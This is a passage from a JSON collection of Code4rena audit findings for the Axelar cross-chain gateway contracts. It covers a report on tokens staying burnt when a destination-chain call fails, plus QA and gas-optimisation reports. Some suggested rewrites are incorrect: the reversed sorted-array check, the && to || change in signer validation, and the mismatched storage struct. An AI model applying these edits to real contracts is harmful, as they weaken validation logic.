201](https://github.com/sseefried/axelar-2022-04/blob/025078cda30e2da561f80166d8f2274c94a0f814/test/DestinationChainContractCallFails.js#L201) can be modified to be a smaller value. Doing so, and re-running the test, will result in a _test failure_ which means that the contract call did _not_ revert i.e. the contract call on the destination chain succeeded. This shows that, before the change, the revert was due to a lack of token B in the `TokenSwapper` contract.\n- [Lines 388-389](https://github.com/sseefried/axelar-2022-04/blob/025078cda30e2da561f80166d8f2274c94a0f814/test/DestinationChainContractCallFails.js#L388-L389) show that, in the case of a revert on the destination chain, the tokens remain burnt on the source chain.\n\n### Tools Used\nManual inspection\n\n### Recommended Mitigation Steps\n\nWhen making a credit card purchase it is common for transactions to remain in a \"pending\" state until eventually finalised. Often one's _available_ bank balance will decrease the moment the purchase has been approved. Then one of\ntwo things happens:\n- the transaction is finalised and the balance becomes the same as the available balance\n- the transaction fails and the amount is refunded\n\nI suggest a similar design for cross-chain contract calls, with one major difference: the token should still be burned on the source chain but it should be re-minted and refunded in case of a contract call failure on the destination chain. The steps would be roughly this:\n\n- User calls `AxelarGateway.callContractWithToken()` and tokens are burned\n- Steps 3 - 8 from the [competition page](https://code4rena.com/contests/2022-04-axelar-network-contest#cross-chain-smart-contract-call) occur as normal.\n- However, the call to `executeWithToken` in step 8 now fails. This is monitored by the Axelar Network and a new event e.g. `ContractCalledFailed` is emitted on the _destination chain_.\n- One the _source chain_ the Axelar Network emits a new event e.g. `ContractCallFailedWithRefund`. This causes a re-minting of the tokens and a refund to the user to occur. The event should also be observable by the user. It should contain a reason for the contract call failure so that they are informed as to why it failed\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-axelar-findings",
      "repo": "https://github.com/code-423n4/2022-04-axelar-findings",
      "url": "https://github.com/code-423n4/2022-04-axelar-findings/issues/35"
    }
  },
  {
    "title": "QA Report",
    "body": "### `name` and `symbol` should be immutable\n\nA mismatch between doc and code.\n\nProof of Concept:\n\nin ERC20.sol constructor:\n\n`/**\n     * @dev Sets the values for {name}, {symbol}, and {decimals}. All three of these values are immutable: they can only be set once during construction.\n     */`\n\nhowever, in the code they are declared:\n`string public name;`\n`string public symbol;`\n\ntherefore they should be immutuable, \nand anyway there is a mismatch between the doc and the code.\n\nRecommended Mitigation Steps:\nchange variables to\n\n`string public imuutable name;`\n`string public immutable symbol;`\n\n### Missing docs\nMost functions and logic are missing documentation and comments\n\nAdminMultisigBase \nAxelarGateway\nAxelarGatewayMultisig\nAxelarGatewaySinglesig\nAxelarGatewayProxy\nBurnableMintableCappedERC20\nERC20Permit\nMintableCappedERC20\nOwnable\nTokenDeployer\n\n### Use enum or struct for lock states\nIn DepositHandler.sol,\nuse enum instead of 2 unit256 for LOCK variables. will make the code nicer and more structured.",
    "dataSource": {
      "name": "code-423n4/2022-04-axelar-findings",
      "repo": "https://github.com/code-423n4/2022-04-axelar-findings",
      "url": "https://github.com/code-423n4/2022-04-axelar-findings/issues/34"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# 1. Use != 0 instead of > 0\n\n## Impact\n\nUsing `> 0` uses slightly more gas than using `!= 0`. Use `!= 0` when comparing uint variables to zero, which cannot hold values below zero\n\n## Proof of Concept\n\nOne instance of this gas savings was found\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGateway.sol#L269\n\n## Tools Used\n\ngrep\n\n## Recommended Mitigation Steps\n\nReplace `> 0` with `!= 0` to save gas\n\n# 2. Use prefix not postfix in loops\n\n## Impact\n\nUsing a prefix increment (++i) instead of a postfix increment (i++) saves gas for each loop cycle, so it can have a big gas impact when the loop executes on a large number of elements.\n\n## Proof of Concept\n\nPrefix is used in some for loops, but these locations use postfix:\n\nutil/AddressFormat.sol:14:        for (uint256 i = 0; i < data.length; i++) {\nAxelarGatewayMultisig.sol:118:        for (uint256 i; i < accounts.length; i++) {\nAxelarGatewayMultisig.sol:140:        for (uint256 i; i < ownerCount; i++) {\nAxelarGatewayMultisig.sol:181:        for (uint256 i; i < accountLength; i++) {\nAxelarGatewayMultisig.sol:271:        for (uint256 i; i < accounts.length; i++) {\nAxelarGatewayMultisig.sol:293:        for (uint256 i; i < operatorCount; i++) {\nAxelarGatewayMultisig.sol:332:        for (uint256 i; i < accountLength; i++) {\nAxelarGatewayMultisig.sol:495:        for (uint256 i; i < signatureCount; i++) {\nAxelarGatewayMultisig.sol:526:        for (uint256 i; i < commandsLength; i++) {\nAdminMultisigBase.sol:51:        for (uint256 i; i < adminCount; i++) {\nAdminMultisigBase.sol:158:        for (uint256 i; i < adminLength; i++) {\nAxelarGatewaySinglesig.sol:269:        for (uint256 i; i < commandsLength; i++) {\nAxelarGateway.sol:225:        for (uint256 i; i < adminCount; i++) {\n\n## Tools Used\n\ngrep\n\n## Recommended Mitigation Steps\n\nUse prefix not postfix to increment in a loop\n\n# 3. Use Solidity errors instead of require\n\n## Impact\n\nSolidity errors introduced in version 0.8.4 can save gas on revert conditions\nhttps://blog.soliditylang.org/2021/04/21/custom-errors/\nhttps://twitter.com/PatrickAlphaC/status/1505197417884528640\n\n## Proof of Concept\n\nSome error messages are used, but many require blocks still exist in the code. Many zero address check instances are in ERC20.sol\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/ERC20.sol#L164\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/ERC20.sol#L165\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/ERC20.sol#L184\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/ERC20.sol#L205\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/ERC20.sol#L232\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/ERC20.sol#L233\n\n## Tools Used\n\nManual analysis\n\n## Recommended Mitigation Steps\n\nReplace require blocks with new solidity errors described in https://blog.soliditylang.org/2021/04/21/custom-errors/\n\n# 4. Add payable to functions that won't receive ETH\n\n## Impact\n\nIdentifying a function as payable saves gas. Functions that have the onlyOwner modifier cannot be called by normal users and will not mistakenly receive ETH. These functions can be payable to save gas.\n\n## Proof of Concept\n\nThere are many functions that have the onlyOwner modifier and can be payable\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/Ownable.sol#L20\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/MintableCappedERC20.sol#L23\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/MintableCappedERC20.sol#L31\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/BurnableMintableCappedERC20.sol#L48\n\n## Tools Used\n\nManual analysis\n\n## Recommended Mitigation Steps\n\nAdd payable to these functions for gas savings\n\n# 5. Use simple comparison\n\n## Impact\n\nThe comparison operators >= and <= use more gas than >, <, or ==. Replacing the  >= and ≤ operators with a comparison operator that has an opcode in the EVM saves gas\n\n## Proof of Concept\n\nThis code is in _isSortedAscAndContainsNoDuplicate from AxelarGatewayMultisig is the same as an if/else statement\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGatewayMultisig.sol#L41-L49\n```\nfunction _isSortedAscAndContainsNoDuplicate(address[] memory accounts) internal pure returns (bool) {\n    for (uint256 i; i < accounts.length - 1; ++i) {\n        if (accounts[i] >= accounts[i + 1]) {\n            return false;\n        }\n    }\n\n    return true;\n}\n```\n\nA simple comparison can be used for gas savings by reversing the logic. Because this happens in a for loop, the savings may be more noticeable\n```\nfunction _isSortedAscAndContainsNoDuplicate(address[] memory accounts) internal pure returns (bool) {\n    for (uint256 i; i < accounts.length - 1; ++i) {\n        if (accounts[i] < accounts[i + 1]) {\n            return true;\n        }\n    }\n\n    return false;\n}\n```\n\nThe same gas efficiency can be used in two other places with the same pattern\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGatewayMultisig.sol#L114-L123\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGatewayMultisig.sol#L267-L276\n\n## Tools Used\n\nManual analysis\n\n## Recommended Mitigation Steps\n\nReplace the comparison operator and reverse the logic to save gas using the suggestions above",
    "dataSource": {
      "name": "code-423n4/2022-04-axelar-findings",
      "repo": "https://github.com/code-423n4/2022-04-axelar-findings",
      "url": "https://github.com/code-423n4/2022-04-axelar-findings/issues/33"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "1. Better increment\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/AdminMultisigBase.sol#L51\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/AdminMultisigBase.sol#L158\n\nRecommended Mitigation Steps:\nchange `i++` to `++i`\n\n========================================================================\n\n2. Using `immutable` to declare a variable which set once at constructor\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/ERC20Permit.sol#L8\n\nRecommended Mitigation Steps:\nadd `immutable`\n\n========================================================================\n\n3. Using < is cheaper than <=\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/ERC20Permit.sol#L44\n\nRecommended Mitigation Steps:\nChange to `<`\n\n========================================================================",
    "dataSource": {
      "name": "code-423n4/2022-04-axelar-findings",
      "repo": "https://github.com/code-423n4/2022-04-axelar-findings",
      "url": "https://github.com/code-423n4/2022-04-axelar-findings/issues/32"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "### Change i++ to ++i\n\ni++ is generally more expensive because it must increment a value and return the old value,\nso it may require holding two numbers in memory. ++i only uses one number in memory.\n\n*Example*:\n\n`for (uint256 i; i < adminCount; i++) -> for (uint256 i; i < adminCount; ++i) `\n\nline 255 in AxelarGateway.sol.\n\nAffected contracts:\nAdminMultisigBase.sol\nAxelarGateway.sol\nAxelarGatewayMultisig.sol\nAxelarGatewaySinglesig.sol\nAddressFormat.sol\n\n### Use calldata instead of memory\nusing calldata for function parameters which do not change inside the function,\ninstead of memory, has proven to save gas.\n\nAxelarGatewayMultisig.sol, l41\nAdminMultisigBase.sol, l144\nAxelarGateway.sol\nAxelarGatewaySinglesig.sol\n\n### Loop cache\nsave array length locally instead of calling .length in the loop every iteration.\nFewer memory calls result in less gas consumption.\n\n*POC*:\n\n`for (uint256 i; i < accounts.length - 1; ++i) `\n\nevery loop call accounts.length is called\n\n*change to*\nlength = accounts.length\nfor (uint256 i; i < length - 1; ++i) \nevery loop call accounts.length is called\n\n*Affected contracts*:\nAxelarGatewayMultisig._isSortedAscAndContainsNoDuplicate\nAddressFormat.sol, l14 (library)\n\n### make `cap` variable immutable\nimmutable variables consume less gas\n\n*change*\n`uint256 public cap; `\n*to*\n`uint256 public immutable cap; `\n\nin MintableCappedERC20.sol\n\n\n### Unnecessary State Variables\nIn DepositHandler.sol. using 3 state variables for the lock when actually just 1 is needed.\nWasting storage space results in wasting gas, and many storage calls consume a lot of gas.\n\ncan resolve by changing lock mechanism to receive unit values;\n`set _lockedStatus = unit256(0)`\nand\n`set _lockedStatus = unit256(1)`\n\n### Do not explicitly initialize uint256 i = 0\nUninitialized variables are automatically initialized\nto 0, doing it explicitly will cost more gas.\n\n*poc*:\n`for (uint256 i = 0; i < length; i++)`\n\n*change to*\n`for (uint256 i; i < length; i++)`\n\nin AddressFormat.sol",
    "dataSource": {
      "name": "code-423n4/2022-04-axelar-findings",
      "repo": "https://github.com/code-423n4/2022-04-axelar-findings",
      "url": "https://github.com/code-423n4/2022-04-axelar-findings/issues/31"
    }
  },
  {
    "title": "QA Report",
    "body": "1. Unmatch comment with actual code\n\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/ERC20.sol#L48\n\nits said that :\n    ``` * All three of these values are immutable``\n\nbut in actual code`name` and `symbol` arent immutable value. so it would be missleading information on comment sectioin.\n\n\n##Tool Used \nManual Review, Remix\n\n##Recommended Mitigation\nChange it or remove it\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-axelar-findings",
      "repo": "https://github.com/code-423n4/2022-04-axelar-findings",
      "url": "https://github.com/code-423n4/2022-04-axelar-findings/issues/30"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "1. Better way to use nonReenter for saving more gas\n\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/DepositHandler.sol#L6-L7\n\nThis implementation for nonReenter, can be used 1 and 2, instead of 0 and 1 for saving more gas. \n\n##Tool Used \nManual Review \n\n##POC\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol\n\n```\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n\n\n    // The values being non-zero value makes deployment a bit more expensive,\n    // but in exchange the refund on every call to nonReentrant will be lower in\n    // amount. Since refunds are capped to a percentage of the total\n    // transaction's gas, it is best to keep them low in cases like this one, to\n    // increase the likelihood of the full refund coming into effect.\n```\n\n2. Variable can be set as immutable for saving gas\n\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/MintableCappedERC20.sol\n\nset `cap` as immutable for saving more gas.\n\n## Tool Used\nManual Review \n\n3. Used msg.sender than _msg.sender() for saving more gas \n\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/ERC20.sol\n\nUsing msg.sender was less cost gas than _msg.Sender(). This _msg.Sender() was a replacement for msg.sender.For regular transactions it returns msg.sender and for meta transactions it can be used to return the end user (rather than the relayer). but the implementation for msg.sender can saving more gas more.\n\n##Tool Used\nManual Review \n\n4. Used || operator for saving more gas\n\nhttps://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/AxelarGatewayMultisig.sol#L119\n\nThis implementation below can be saving more gas, has the same output either.\n\n##Tool Used \nRemix & test\n\n##Recommended Mitigation\n```\n            if (_isOwner(epoch, accounts[i]) && ++validSignerCount >= threshold) return true;\n           // 6960521 before\n```\nchange to :\n```\n           if (_isOwner(epoch, accounts[i]) || ++validSignerCount >= threshold) return true;\n          // 6960341 after\n```\n\n5. using ++i than i++ for saving more gas\n\nUsing i++ instead ++i for  all the loops, the variable i is incremented using i++. It is known that implementation by using ++i costs less gas per iteration than i++.\n\n## Tools Used\nRemix\n\n## Occurances\n\n```\nmain/src/AxelarGatewayMultisig.sol#L118\nmain/src/AxelarGatewayMultisig.sol#L140\nmain/src/AxelarGatewayMultisig.sol#L182\nmain/src/AxelarGatewayMultisig.sol#L271\nmain/src/AxelarGatewayMultisig.sol#L293\nmain/src/AxelarGatewayMultisig.sol#L332\nmain/src/AxelarGatewayMultisig.sol#L495\nmain/src/AxelarGatewayMultisig.sol#L526\n```\n\n6. Unnecessary check \n\nhttps://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/AxelarGatewayMultisig.sol#L571-L572\n\nthis can be shorten by not checking `if (success)` just passing into emit and can be saving more gas instead.\n\n##Tool Used\nTest, Remix\n\n##Recommended Mitigation \nRemove if (success) and pass into emit.\n\n7.  Unnecessary Duplicate Check \n\nhttps://github.com/code-423n4/2022-04-axelar/blob/dee2f2d352e8f20f20027977d511b19bfcca23a3/src/AxelarGatewayMultisig.sol#L529\n\nsince if was ignore duplicate commandId received, no function inside contract was called so it would be effective that remove it and saving more gas.\n\n##Tool Used\nManual Review, test\n",
    "dataSource": {
      "name": "code-423n4/2022-04-axelar-findings",
      "repo": "https://github.com/code-423n4/2022-04-axelar-findings",
      "url": "https://github.com/code-423n4/2022-04-axelar-findings/issues/29"
    }
  },
  {
    "title": "QA Report",
    "body": "# Summary\n\nWe list 2 low-critical findings and 4 non-critical findings here:\n* (Low) No checks against provided symbol and actual symbol\n* (Low) Implement `upgrade()` function in proxy rather than implementation\n* (Non) ECDSA only handles specific types of signatures\n* (Non) ERC20Permit timestamp<deadline instead of timestamp<=deadline (different from original implementation)\n* (Non) It’s better to follow common upgradeable patterns\n* (Non) Use EIP712 instead of encodeObjects\n\nIn conclusion, it's better to check the token symbol, use original implementation of ECDSA, and follow EIP712.\n\n# (Low) No checks against provided symbol and actual symbol\n\n## Impact\n\n`_deployToken` function in AxelarGateway.sol doesn't check against the provided symbol and actual symbol of external tokens.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGateway.sol#L336\n\n## Recommended Mitigation Steps\n\nCheck param `symbol` to equal the actual symbol of external token:\n\n```\n        require(symbol == token.symbol(), \"Symbol doesn't match\");\n```\n\n# (Low) Implement `upgrade()` function in proxy rather than implementation\n\n## Impact\n\nThe `upgrade()` function is implemented in `AxelarGateway`. If the new `AxelarGateway` implementation doesn't have an `upgrade()` function, the proxy will not be upgradable.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGateway.sol#L258\n\n## Recommended Mitigation Steps\n\nMove `upgrade()` to the proxy contract.\n\n\n\n# (Non) ECDSA only handles specific types of signatures\n\n## Impact\n\nIn `ECDSA.sol,` `recover()`only handles specific types of signatures. But it should be able to take care of more types.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/ECDSA.sol#L31\n\n## Recommended Mitigation Steps\n\nFollow the original implementation of ECDSA.\n# (Non) ERC20Permit timestamp<deadline instead of timestamp<=deadline (different from original implementation)\n\n## Impact\n\nIn the original openzeppelin implementation, `ERC20Permit/permit()` uses `block.timestamp <= deadline`, but in Axelar, it uses `block.timestamp < deadline`. While this is harmless, we recommend developers to conform to the publicly agreed standards while reimplementing contracts.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/ERC20Permit.sol#L43\n\n\n## Recommended Mitigation Steps\n\nUse `require(block.timestamp <= deadline, 'EXPIRED');` instead\n# (Non) It’s better to follow common upgradeable patterns\n\n## Impact\n\nThe implementation of upgradeable contracts seems to be fine, but it is better to follow common upgradeable patterns, like using `initialize` instead of `setup`. And guard initialization functions with the `initializer` modifier instead of adding a dummy function in Proxy to prevent function delegation.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGateway.sol#L66\n\n\n## Recommended Mitigation Steps\n\nFollow common upgradeable patterns\n\nhttps://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable\n\n# (Non) Use EIP712 instead of encodeObjects\n\n## Impact\n\nCurrent implementations require extreme careful choice between `encode` and `encodePacked`, since `using encodePacked` on data including multiple dynamic length fields will most likely make injections possible. We have manually reviewed and confirmed all choices present in contract are correct, but still advise developers to adopt EIP712 for robustness.\n\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGateway.sol#L482\n\nhttps://github.com/code-423n4/2022-04-axelar/blob/main/src/AxelarGateway.sol#L506\n\n\n## Recommended Mitigation Steps\n\nAdopt EIP712\n",
    "dataSource": {
      "name": "code-423n4/2022-04-axelar-findings",
      "repo": "https://github.com/code-423n4/2022-04-axelar-findings",
      "url": "https://github.com/code-423n4/2022-04-axelar-findings/issues/20"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n\n1. Open TODOS\n\nConsider resolving the TODOs before deploying.\n\n```solidity\nMintableCappedERC20.sol:30:    // TODO move burnFrom into a separate BurnableERC20 contract\n```\n\n2. Related data should be grouped in a struct.\n\nThe \"EternalStorage\" `maps` should be grouped in a struct.\n\nFrom:\n\n```solidity\nFile: EternalStorage.sol\n10:     mapping(bytes32 => uint256) private _uintStorage;\n11:     mapping(bytes32 => string) private _stringStorage;\n12:     mapping(bytes32 => address) private _addressStorage;\n13:     mapping(bytes32 => bytes) private _bytesStorage;\n14:     mapping(bytes32 => bool) private _boolStorage;\n15:     mapping(bytes32 => int256) private _intStorage;\n```\n\nTo\n\n```solidity\n    struct EternalStorageInfo {\n        uint256 _uintStorage;\n        string _stringStorage;\n        address _addressStorage;\n        bytes _bytesStorage;\n        bool _boolStorage;\n        int256 _intStorage;\n    }\n    mapping(address => EternalStorageInfo) private eternalStorageInfo;\n```\n\nIt would be less error-prone, more readable, and it would be possible to delete all related fields with a simple `delete eternalStorageInfo[bytes32]`.",
    "dataSource": {
      "name": "code-423n4/2022-04-axelar-findings",
      "repo": "https://github.com/code-423n4/2022-04-axelar-findings",
      "url": "https://github.com/code-423n4/2022-04-axelar-findings/issues/15"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas Report\n\n**Table of Contents:**\n\n- [Gas Report](#gas-report)\n  - [Foreword](#foreword)\n  - [Findings](#findings)\n    - [Variables](#variables)\n      - [Constants should be literal and their derivation should be in comments](#constants-should-be-literal-and-their-derivation-should-be-in-comments)\n    - [For-Loops](#for-loops)\n      - [An array's length should be cached to save gas in for-loops](#an-arrays-length-should-be-cached-to-save-gas-in-for-loops)\n      - [`++i` costs less gas compared to `i++` or `i += 1`](#i-costs-less-gas-compared-to-i-or-i--1)\n      - [Increments can be unchecked](#increments-can-be-unchecked)\n    - [Arithmetics](#arithmetics)\n      - [Unchecking arithmetics operations that can't underflow/overflow](#unchecking-arithmetics-operations-that-cant-underflowoverflow)\n    - [Errors](#errors)\n      - [Use Custom Errors instead of Revert Strings to save Gas](#use-custom-errors-instead-of-revert-strings-to-save-gas)\n\n## Foreword\n\n- **`@audit` tags**\n\n> The code is annotated at multiple places with `//@audit` comments to pinpoint the issues. Please, pay attention to them for more details.\n\n## Findings\n\n### Variables\n\n#### Constants should be literal and their derivation should be in comments\n\nDue to how `constant` variables are implemented (replacements at compile-time), an expression assigned to a `constant` variable is recomputed each time that the variable is used, which wastes some gas.\n\nWhile I'm certain the sponsor is aware of this fact (thanks to the comments `AUDIT: constants should be literal and their derivation should be in comments`), I figured I'd still centralize the impacted lines of codes here:\n\n```solidity\nAdminMultisigBase.sol:16:    bytes32 internal constant KEY_ADMIN_EPOCH = keccak256('admin-epoch');\nAdminMultisigBase.sol:18:    bytes32 internal constant PREFIX_ADMIN = keccak256('admin');\nAdminMultisigBase.sol:19:    bytes32 internal constant PREFIX_ADMIN_COUNT = keccak256('admin-count');\nAdminMultisigBase.sol:20:    bytes32 internal constant PREFIX_ADMIN_THRESHOLD = keccak256('admin-threshold');\nAdminMultisigBase.sol:21:    bytes32 internal constant PREFIX_ADMIN_VOTE_COUNTS = keccak256('admin-vote-counts');\nAdminMultisigBase.sol:22:    bytes32 internal constant PREFIX_ADMIN_VOTED = keccak256('admin-voted');\nAdminMultisigBase.sol:23:    bytes32 internal constant PREFIX_IS_ADMIN = keccak256('is-admin');\nAxelarGateway.sol:45:    bytes32 internal constant KEY_ALL_TOKENS_FROZEN = keccak256('all-tokens-frozen');\nAxelarGateway.sol:47:    bytes32 internal constant PREFIX_COMMAND_EXECUTED = keccak256('command-executed');\nAxelarGateway.sol:48:    bytes32 internal constant PREFIX_TOKEN_ADDRESS = keccak256('token-address');\nAxelarGateway.sol:49:    bytes32 internal constant PREFIX_TOKEN_TYPE = keccak256('token-type');\nAxelarGateway.sol:50:    bytes32 internal constant PREFIX_TOKEN_FROZEN = keccak256('token-frozen');\nAxelarGateway.sol:51:    bytes32 internal constant PREFIX_CONTRACT_CALL_APPROVED = keccak256('contract-call-approved');\nAxelarGateway.sol:52:    bytes32 internal constant PREFIX_CONTRACT_CALL_APPROVED_WITH_MINT = keccak256('contract-call-approved-with-mint');\nAxelarGateway.sol:54:    bytes32 internal constant SELECTOR_BURN_TOKEN = keccak256('burnToken');\nAxelarGateway.sol:55:    bytes32 internal constant SELECTOR_DEPLOY_TOKEN = keccak256('deployToken');\nAxelarGateway.sol:56:    bytes32 internal constant SELECTOR_MINT_TOKEN = keccak256('mintToken');\nAxelarGateway.sol:57:    bytes32 internal constant SELECTOR_APPROVE_CONTRACT_CALL = keccak256('approveContractCall');\nAxelarGateway.sol:58:    bytes32 internal constant SELECTOR_APPROVE_CONTRACT_CALL_WITH_MINT = keccak256('approveContractCallWithMint');\nAxelarGateway.sol:59:    bytes32 internal constant SELECTOR_TRANSFER_OPERATORSHIP = keccak256('transferOperatorship');\nAxelarGateway.sol:60:    bytes32 internal constant SELECTOR_TRANSFER_OWNERSHIP = keccak256('transferOwnership');\nAxelarGatewayMultisig.sol:25:    bytes32 internal constant KEY_OWNER_EPOCH = keccak256('owner-epoch');\nAxelarGatewayMultisig.sol:27:    bytes32 internal constant PREFIX_OWNER = keccak256('owner');\nAxelarGatewayMultisig.sol:28:    bytes32 internal constant PREFIX_OWNER_COUNT = keccak256('owner-count');\nAxelarGatewayMultisig.sol:29:    bytes32 internal constant PREFIX_OWNER_THRESHOLD = keccak256('owner-threshold');\nAxelarGatewayMultisig.sol:30:    bytes32 internal constant PREFIX_IS_OWNER = keccak256('is-owner');\nAxelarGatewayMultisig.sol:32:    bytes32 internal constant KEY_OPERATOR_EPOCH = keccak256('operator-epoch');\nAxelarGatewayMultisig.sol:34:    bytes32 internal constant PREFIX_OPERATOR = keccak256('operator');\nAxelarGatewayMultisig.sol:35:    bytes32 internal constant PREFIX_OPERATOR_COUNT = keccak256('operator-count');\nAxelarGatewayMultisig.sol:36:    bytes32 internal constant PREFIX_OPERATOR_THRESHOLD = keccak256('operator-threshold');\nAxelarGatewayMultisig.sol:37:    bytes32 internal constant PREFIX_IS_OPERATOR = keccak256('is-operator');\n```\n\nAs already proposed by a previous auditor, I suggest hardcoding the computed values from these expressions in the constants variables and add a comment above them to say how the value was calculated.\n\n### For-Loops\n\n#### An array's length should be cached to save gas in for-loops\n\nReading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  \n  \nCaching the array length in the stack saves around 3 gas per iteration.  \n\nHere, I suggest storing the array's length in a variable before the for-loop, and use it instead:\n\n```solidity\nAxelarGatewayMultisig.sol:42:        for (uint256 i; i < accounts.length - 1; ++i) {\nAxelarGatewayMultisig.sol:118:        for (uint256 i; i < accounts.length; i++) {\nAxelarGatewayMultisig.sol:271:        for (uint256 i; i < accounts.length; i++) {\n\n```\n\nThis is already done at most places in the solution.\n\n#### `++i` costs less gas compared to `i++` or `i += 1`\n\n`++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.\n\n`i++` increments `i` and returns the initial value of `i`. Which means:  \n  \n```solidity\nuint i = 1;  \ni++; // == 1 but i == 2  \n```\n  \nBut `++i` returns the actual incremented value:  \n  \n```solidity\nuint i = 1;  \n++i; // == 2 and i == 2 too, so no need for a temporary variable  \n```\n  \nIn the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`  \n  \nInstances include:  \n\n```solidity\nAdminMultisigBase.sol:51:        for (uint256 i; i < adminCount; i++) {\nAdminMultisigBase.sol:158:        for (uint256 i; i < adminLength; i++) {\nAxelarGateway.sol:225:        for (uint256 i; i < adminCount; i++) {\nAxelarGatewayMultisig.sol:118:        for (uint256 i; i < accounts.length; i++) {\nAxelarGatewayMultisig.sol:140:        for (uint256 i; i < ownerCount; i++) {\nAxelarGatewayMultisig.sol:181:        for (uint256 i; i < accountLength; i++) {\nAxelarGatewayMultisig.sol:271:        for (uint256 i; i < accounts.length; i++) {\nAxelarGatewayMultisig.sol:293:        for (uint256 i; i < operatorCount; i++) {\nAxelarGatewayMultisig.sol:332:        for (uint256 i; i < accountLength; i++) {\nAxelarGatewayMultisig.sol:495:        for (uint256 i; i < signatureCount; i++) {\nAxelarGatewayMultisig.sol:526:        for (uint256 i; i < commandsLength; i++) {\n```\n\nI suggest using `++i` instead of `i++` to increment the value of an uint variable, just like it's done here:\n\n```solidity\nAxelarGatewayMultisig.sol:42:        for (uint256 i; i < accounts.length - 1; ++i) {\n```\n\n#### Increments can be unchecked\n\nIn Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.  \n  \n[ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695)\n\nInstances include:  \n\n```solidity\nAdminMultisigBase.sol:51:        for (uint256 i; i < adminCount; i++) {\nAdminMultisigBase.sol:158:        for (uint256 i; i < adminLength; i++) {\nAxelarGateway.sol:225:        for (uint256 i; i < adminCount; i++) {\nAxelarGatewayMultisig.sol:42:        for (uint256 i; i < accounts.length - 1; ++i) {\nAxelarGatewayMultisig.sol:118:        for (uint256 i; i < accounts.length; i++) {\nAxelarGatewayMultisig.sol:140:        for (uint256 i; i < ownerCount; i++) {\nAxelarGatewayMultisig.sol:181:        for (uint256 i; i < accountLength; i++) {\nAxelarGatewayMultisig.sol:271:        for (uint256 i; i < accounts.length; i++) {\nAxelarGatewayMultisig.sol:293:        for (uint256 i; i < operatorCount; i++) {\nAxelarGatewayMultisig.sol:332:        for (uint256 i; i < accountLength; i++) {\nAxelarGatewayMultisig.sol:495:        for (uint256 i; i < signatureCount; i++) {\nAxelarGatewayMultisig.sol:526:        for (uint256 i; i < commandsLength; i++) {\n```\n\nThe code would go from:  \n  \n```solidity\nfor (uint256 i; i < numIterations; i++) {  \n // ...  \n}  \n```\n\nto:  \n\n```solidity\nfor (uint256 i; i < numIterations;) {  \n // ...  \n unchecked { ++i; }  \n}  \n```\n\nThe risk of overflow is inexistant for a `uint256` here.\n\n### Arithmetics  \n\n#### Unchecking arithmetics operations that can't underflow/overflow\n\nSolidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn't possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an `unchecked` block: <https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic>\n\nI suggest wrapping with an `unchecked` block here (see `@audit` tags for more details):\n\n```solidity\nsrc/AxelarGatewayMultisig.sol:\n  103:         uint256 lowerBoundOwnerEpoch = epoch > recentEpochs ? epoch - recentEpochs : uint256(0); //@audit gas: should be unchecked due to condition in ternary operation\n  257:         uint256 